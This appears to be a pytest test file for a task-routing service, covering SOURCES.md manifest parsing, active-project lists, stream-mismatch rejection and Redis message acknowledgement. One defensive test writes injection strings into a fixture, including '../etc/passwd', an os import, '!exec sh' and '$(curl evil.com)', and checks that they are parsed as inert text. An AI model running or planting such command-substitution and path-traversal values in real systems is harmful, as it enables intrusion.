"""
Sprint 007 G64b — source_reader + project_id routing tests (v0.2, 11 TCs).

TC-G64b-a   read_sources('mumega') succeeds with real SOURCES.md
TC-G64b-b   read_sources('nonexistent') raises SourceNotFoundError
TC-G64b-c   read_sources('malformed-test') raises SourceManifestParseError with line number
TC-G64b-d   list_active_projects() returns frozenset including s007-onboard-test
TC-G64b-e   Dispatch with inactive project emits emit_inactive_project_filtered + skips
TC-G64b-f   Dispatch with project_id=None raises MissingProjectIdError
TC-G64b-g   Dispatch with project_id='mumega' (active) proceeds normally
TC-G64b-h   Stream cross-check mismatch emits emit_project_id_stream_mismatch + skips
TC-G64b-i   list_active_projects() with corrupt JSON raises SourceManifestParseError
TC-G64b-j   XREADGROUP loop: msg #2 missing project_id → ACK all 3, emit for #2, process #1+#3
TC-G64b-k   read_sources with injection content returns safe parsed manifest (no eval/exec)
"""
from __future__ import annotations

import json
import textwrap
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from sos.services.brain.source_reader import (
    MissingProjectIdError,
    SourceManifest,
    SourceManifestParseError,
    SourceNotFoundError,
    extract_project_from_stream,
    is_active,
    list_active_projects,
    read_sources,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def tmp_projects(tmp_path: Path) -> Path:
    """Create a temporary projects directory with test SOURCES.md files."""
    # Valid mumega
    mumega_dir = tmp_path / "mumega"
    mumega_dir.mkdir()
    (mumega_dir / "SOURCES.md").write_text(textwrap.dedent("""\
        # Mumega Sources

        ## motor
        - sos/services/brain/service.py

        ## sensor
        - sos/jobs/audit_anchor.py

        ## memory
        - mirror/mirror_api.py

        ## signal
        - sos/bus/bridge.py
    """))

    # Valid s007-onboard-test
    test_dir = tmp_path / "s007-onboard-test"
    test_dir.mkdir()
    (test_dir / "SOURCES.md").write_text(textwrap.dedent("""\
        # s007-onboard-test

        ## motor
        - TBD placeholder

        ## sensor
        - TBD placeholder

        ## memory
        - TBD placeholder

        ## signal
        - TBD placeholder
    """))

    # Malformed — missing signal section
    mal_dir = tmp_path / "malformed-test"
    mal_dir.mkdir()
    (mal_dir / "SOURCES.md").write_text(textwrap.dedent("""\
        # Malformed

        ## motor
        - entry1

        ## sensor
        - entry2

        ## memory
        - entry3
    """))

    return tmp_path


@pytest.fixture
def tmp_active_projects(tmp_path: Path) -> Path:
    """Create a valid active_projects.json."""
    config = {
        "active": ["mumega", "reserve", "s007-onboard-test"],
        "updated_at": "2026-04-26T01:00:00Z",
        "updated_by": "loom",
    }
    cfg_path = tmp_path / "active_projects.json"
    cfg_path.write_text(json.dumps(config))
    return cfg_path


# ---------------------------------------------------------------------------
# TC-G64b-a: read_sources('mumega') succeeds
# ---------------------------------------------------------------------------


def test_g64b_a_read_sources_mumega(tmp_projects: Path) -> None:
    """TC-G64b-a: read_sources('mumega') returns a valid SourceManifest."""
    manifest = read_sources("mumega", base_dir=tmp_projects)
    assert isinstance(manifest, SourceManifest)
    assert manifest.project_slug == "mumega"
    assert len(manifest.motor) >= 1
    assert len(manifest.sensor) >= 1
    assert len(manifest.memory) >= 1
    assert len(manifest.signal) >= 1


# ---------------------------------------------------------------------------
# TC-G64b-b: read_sources('nonexistent') raises SourceNotFoundError
# ---------------------------------------------------------------------------


def test_g64b_b_nonexistent_raises(tmp_projects: Path) -> None:
    """TC-G64b-b: read_sources for missing project raises SourceNotFoundError."""
    with pytest.raises(SourceNotFoundError):
        read_sources("nonexistent", base_dir=tmp_projects)


# ---------------------------------------------------------------------------
# TC-G64b-c: malformed SOURCES.md raises SourceManifestParseError
# ---------------------------------------------------------------------------


def test_g64b_c_malformed_raises(tmp_projects: Path) -> None:
    """TC-G64b-c: malformed SOURCES.md raises SourceManifestParseError."""
    with pytest.raises(SourceManifestParseError) as exc_info:
        read_sources("malformed-test", base_dir=tmp_projects)
    assert "signal" in str(exc_info.value).lower()


# ---------------------------------------------------------------------------
# TC-G64b-d: list_active_projects includes s007-onboard-test
# ---------------------------------------------------------------------------


def test_g64b_d_active_projects(tmp_active_projects: Path) -> None:
    """TC-G64b-d: list_active_projects returns frozenset with s007-onboard-test."""
    projects = list_active_projects(config_path=tmp_active_projects)
    assert isinstance(projects, frozenset)
    assert "s007-onboard-test" in projects
    assert "mumega" in projects
    assert "reserve" in projects


# ---------------------------------------------------------------------------
# TC-G64b-e: inactive project → emit + skip dispatch
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_g64b_e_inactive_project_skips() -> None:
    """TC-G64b-e: task.created with inactive project → emit + skip dispatch."""
    from sos.services.brain.service import BrainService

    emitted: list[dict] = []

    def _mock_emit(project_id, message_id, reason="not_in_active_set"):
        emitted.append({"project_id": project_id, "reason": reason})

    msg = {
        "type": "task.created",
        "stream": "sos:stream:global:squad:inactive-project",
        "entry_id": "entry-001",
        "task_id": "task-001",
        "project": "inactive-project",
        "title": "test",
    }

    svc = BrainService.__new__(BrainService)
    svc.state = MagicMock()
    svc.state.tasks_in_flight = set()

    with patch("sos.services.brain.service.is_active", return_value=False), \
         patch("sos.observability.sprint_telemetry.emit_inactive_project_filtered",
               side_effect=_mock_emit):
        await svc._on_task_created(msg)

    # Task should NOT be in-flight (dispatch was skipped)
    assert "task-001" not in svc.state.tasks_in_flight
    assert len(emitted) == 1
    assert emitted[0]["project_id"] == "inactive-project"


# ---------------------------------------------------------------------------
# TC-G64b-f: project_id=None raises MissingProjectIdError
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_g64b_f_missing_project_raises() -> None:
    """TC-G64b-f: task.created with no project raises MissingProjectIdError."""
    from sos.services.brain.service import BrainService

    msg = {
        "type": "task.created",
        "stream": "sos:stream:global:squad:brain",
        "entry_id": "entry-002",
        "task_id": "task-002",
        "title": "test",
        # No "project" or "project_id" field
    }

    svc = BrainService.__new__(BrainService)
    svc.state = MagicMock()

    with pytest.raises(MissingProjectIdError):
        await svc._on_task_created(msg)


# ---------------------------------------------------------------------------
# TC-G64b-g: active project proceeds normally
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_g64b_g_active_project_dispatches() -> None:
    """TC-G64b-g: task.created with active project dispatches normally."""
    from sos.services.brain.service import BrainService

    msg = {
        "type": "task.created",
        "stream": "sos:stream:global:squad:mumega",
        "entry_id": "entry-003",
        "task_id": "task-003",
        "project": "mumega",
        "title": "test task",
        "priority": "high",
    }

    svc = BrainService.__new__(BrainService)
    svc.state = MagicMock()
    svc.state.tasks_in_flight = set()
    svc.state.task_skills = {}
    svc._redis = AsyncMock()
    svc._redis.xadd = AsyncMock()

    with patch("sos.services.brain.service.is_active", return_value=True), \
         patch("sos.services.brain.service.extract_project_from_stream", return_value="mumega"), \
         patch.object(svc, "_try_dispatch_next", new_callable=AsyncMock):
        await svc._on_task_created(msg)

    # Task should be in-flight (dispatch proceeded)
    assert "task-003" in svc.state.tasks_in_flight


# ---------------------------------------------------------------------------
# TC-G64b-h: stream cross-check mismatch → emit + skip
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_g64b_h_stream_mismatch_skips() -> None:
    """TC-G64b-h: project_id='mumega' on stream squad:reserve → mismatch emit + skip."""
    from sos.services.brain.service import BrainService

    emitted: list[dict] = []

    def _mock_mismatch(claimed_id, actual_key, message_id):
        emitted.append({"claimed": claimed_id, "actual": actual_key})

    msg = {
        "type": "task.created",
        "stream": "sos:stream:global:squad:reserve",
        "entry_id": "entry-004",
        "task_id": "task-004",
        "project": "mumega",  # claims mumega but arrived on reserve stream
        "title": "spoofed",
    }

    svc = BrainService.__new__(BrainService)
    svc.state = MagicMock()
    svc.state.tasks_in_flight = set()

    with patch("sos.observability.sprint_telemetry.emit_project_id_stream_mismatch",
               side_effect=_mock_mismatch):
        await svc._on_task_created(msg)

    assert "task-004" not in svc.state.tasks_in_flight
    assert len(emitted) == 1
    assert emitted[0]["claimed"] == "mumega"
    assert emitted[0]["actual"] == "reserve"


# ---------------------------------------------------------------------------
# TC-G64b-i: corrupt active_projects.json raises SourceManifestParseError
# ---------------------------------------------------------------------------


def test_g64b_i_corrupt_json_raises(tmp_path: Path) -> None:
    """TC-G64b-i: corrupt active_projects.json raises SourceManifestParseError."""
    # Truncated JSON
    cfg1 = tmp_path / "truncated.json"
    cfg1.write_text('{"active": [')
    with pytest.raises(SourceManifestParseError):
        list_active_projects(config_path=cfg1)

    # Missing 'active' key
    cfg2 = tmp_path / "missing_key.json"
    cfg2.write_text('{"foo": "bar"}')
    with pytest.raises(SourceManifestParseError):
        list_active_projects(config_path=cfg2)

    # active is not a list
    cfg3 = tmp_path / "bad_type.json"
    cfg3.write_text('{"active": "not-a-list"}')
    with pytest.raises(SourceManifestParseError):
        list_active_projects(config_path=cfg3)


# ---------------------------------------------------------------------------
# TC-G64b-j: XREADGROUP loop — msg #2 missing project → ACK all 3
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_g64b_j_loop_handles_missing_project() -> None:
    """TC-G64b-j: XREADGROUP loop ACKs msg with missing project, processes others normally."""
    from sos.services.brain.service import BrainService

    import redis.asyncio as aioredis

    svc = BrainService.__new__(BrainService)
    svc._redis = AsyncMock(spec=aioredis.Redis)
    svc._redis.xadd = AsyncMock()
    svc._consumer_name = "brain"
    svc._group_name = "brain"
    svc._seen_ids = MagicMock()
    svc._seen_ids.__contains__ = MagicMock(return_value=False)
    svc._seen_ids.add = MagicMock()

    # Build real-enough state for task scoring
    from sos.services.brain.state import BrainState
    svc.state = BrainState()

    # Track what gets ACKed
    acked: list[str] = []
    original_xack = AsyncMock(side_effect=lambda stream, group, entry_id: acked.append(entry_id))
    svc._redis.xack = original_xack

    # Build 3 messages: #1 valid, #2 missing project, #3 valid
    def make_fields(entry_id: str, project: str | None) -> dict:
        payload = {"task_id": f"task-{entry_id}", "title": "test"}
        if project:
            payload["project"] = project
        return {
            "type": "task.created",
            "payload": json.dumps(payload),
            "message_id": f"msg-{entry_id}",
        }

    entries = [
        ("entry-1", make_fields("1", "mumega")),
        ("entry-2", make_fields("2", None)),       # missing project
        ("entry-3", make_fields("3", "mumega")),
    ]

    # Mock xreadgroup to return our 3 entries
    svc._redis.xreadgroup = AsyncMock(return_value=[
        ("sos:stream:global:squad:mumega", entries),
    ])
    svc._stream_patterns = ["sos:stream:global:squad:*"]
    svc._groups_registered = {"sos:stream:global:squad:mumega"}
    svc._stop_event = MagicMock()
    svc._stop_event.is_set = MagicMock(return_value=False)
    svc._bus_service = None

    emit_calls: list[dict] = []

    with patch("sos.services.brain.service.is_active", return_value=True), \
         patch("sos.services.brain.service.extract_project_from_stream", return_value="mumega"), \
         patch.object(svc, "_try_dispatch_next", new_callable=AsyncMock), \
         patch.object(svc, "_persist_snapshot", new_callable=AsyncMock), \
         patch.object(svc, "_discover_streams", new_callable=AsyncMock, return_value=["sos:stream:global:squad:mumega"]), \
         patch("sos.observability.sprint_telemetry.emit_missing_project_id",
               side_effect=lambda mid, sk, **kw: emit_calls.append({"message_id": mid, "stream": sk})), \
         patch("sos.kernel.trace_context.use_trace_id", return_value=MagicMock(__enter__=MagicMock(), __exit__=MagicMock())), \
         patch("sos.kernel.telemetry.span_under_current_trace", return_value=MagicMock(__enter__=MagicMock(), __exit__=MagicMock())):
        await svc._tick()

    # All 3 messages should be ACKed (including #2 via BLOCK-3 handler)
    assert len(acked) == 3, f"Expected 3 ACKs, got {len(acked)}: {acked}"
    assert "entry-2" in acked

    # emit_missing_project_id should fire for msg #2
    assert len(emit_calls) == 1
    assert "msg-2" in emit_calls[0]["message_id"]


# ---------------------------------------------------------------------------
# TC-G64b-k: SOURCES.md injection content → safe parse (BLOCK-4)
# ---------------------------------------------------------------------------


def test_g64b_k_injection_content_safe(tmp_path: Path) -> None:
    """TC-G64b-k: SOURCES.md with path traversal, eval, and shell injection → safe parse."""
    inject_dir = tmp_path / "inject-test"
    inject_dir.mkdir()
    (inject_dir / "SOURCES.md").write_text(textwrap.dedent("""\
        # Injection test

        ## motor
        - ../etc/passwd

        ## sensor
        - __import__('os')

        ## memory
        - !exec sh

        ## signal
        - $(curl evil.com)
    """))

    # Should parse successfully — content is inert strings
    manifest = read_sources("inject-test", base_dir=tmp_path)
    assert isinstance(manifest, SourceManifest)
    # Content stored as-is (inert), never executed
    assert "../etc/passwd" in manifest.motor
    assert "__import__('os')" in manifest.sensor
    assert "!exec sh" in manifest.memory
    assert "$(curl evil.com)" in manifest.signal


# ---------------------------------------------------------------------------
# Helpers: extract_project_from_stream unit tests
# ---------------------------------------------------------------------------


def test_extract_project_from_stream() -> None:
    """Verify stream key parsing."""
    assert extract_project_from_stream("sos:stream:global:squad:mumega") == "mumega"
    assert extract_project_from_stream("sos:stream:global:squad:reserve") == "reserve"
    assert extract_project_from_stream("sos:stream:global:squad:s007-onboard-test") == "s007-onboard-test"
    assert extract_project_from_stream("sos:stream:global:registry") is None
    assert extract_project_from_stream("sos:stream:global:agent:kasra") is None
    assert extract_project_from_stream("sos:stream:global:squad:") is None


def test_list_active_projects_missing_file(tmp_path: Path) -> None:
    """list_active_projects returns safe default when file missing."""
    missing = tmp_path / "nonexistent.json"
    projects = list_active_projects(config_path=missing)
    assert projects == frozenset({"mumega", "reserve"})
